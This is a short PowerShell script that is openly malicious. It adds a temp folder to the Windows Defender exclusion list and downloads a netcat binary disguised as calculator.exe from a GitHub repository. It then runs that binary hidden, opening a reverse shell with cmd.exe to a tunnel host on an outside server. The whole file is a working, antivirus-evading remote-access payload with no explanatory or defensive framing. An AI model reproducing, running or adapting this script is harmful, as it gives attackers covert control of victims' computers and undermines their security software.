$ErrorActionPreference = 'SilentlyContinue'

$TempDir = "C:\TempVBS"
$NcPath = "$TempDir\nc.exe"

try {
    New-Item -ItemType Directory -Force -Path $TempDir | Out-Null
} catch {}

try {
    Add-MpPreference -ExclusionPath $TempDir
} catch {}

Start-Sleep -Seconds 1

try {
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/KaiKim2/WindowsDefenderBypassNetcat/main/calculator.exe" -OutFile $NcPath
} catch {}

try {
    $WshShell = New-Object -ComObject WScript.Shell
    $WshShell.Run("C:\TempVBS\nc.exe tmezp-152-58-178-192.a.free.pinggy.link 37321 -e cmd.exe", 0, $false)
} catch {}

Start-Sleep -Seconds 1
